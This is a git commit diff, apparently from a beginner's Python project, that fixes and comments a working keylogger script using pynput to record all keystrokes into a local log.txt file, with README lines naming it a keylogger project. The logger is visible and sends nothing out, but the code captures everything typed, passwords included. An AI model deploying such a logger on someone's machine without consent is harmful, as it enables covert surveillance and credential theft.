f136980ec6d04ec3f99789e250bb03269de9a359
ch581 <127572653+ch581@users.noreply.github.com>
2024-10-31 00:13:40 +0000

    first commit

--- MainLogger.py
+++ MainLogger.py
@@ -1,37 +1,39 @@
-# Storing Key strokes in a text file
-# File Handling- How to read write and append to a file
 import pynput
-
 from pynput.keyboard import Key, Listener
 
+# Initialize counter and list to store keystrokes
 count = 0
 keys = []
-
+# Function to handle key press events
 def key_press(key):
     global keys, count
     keys.append(key)
-    count +=1
+    count += 1
     print(f"{key} pressed")
     
+    # Write to file after every 15 keystrokes
     if count >= 15:
         count = 0
         write_file(keys)
         keys = []
-    
-def write_file(keys):
-    with open("log.txt","a") as F:
-        for key in keys:
-            k = str(key).replace('"', " ")
-            if k.find("space") > 0:
-                f.write('\n')
-            elif k.find('Key') == -1:
-                f.write(k)
-            
 
+# Function to write keystrokes to a file
+def write_file(keys):
+    with open("log.txt", "a") as F:
+        for key in keys:
+            k = str(key).replace("'", "")
+            # Insert a newline for spaces, otherwise write the key as is
+            if k.find("space") > 0:
+                F.write('\n')
+            elif k.find("Key") == -1:
+                F.write(k)
+
+# Function to handle key release events
 def key_release(key):
-    if key == keys.esc:
+    # Stop listener if escape key is pressed
+    if key == Key.esc:
         return False
-    
-    
+
+# Set up and start listener
 with Listener(on_press=key_press, on_release=key_release) as listener:
     listener.join()
--- README.md
+++ README.md
@@ -1,1 +1,2 @@
 "# Python-basic-keylogger-project" 
+"# Infotech-key-logger" 
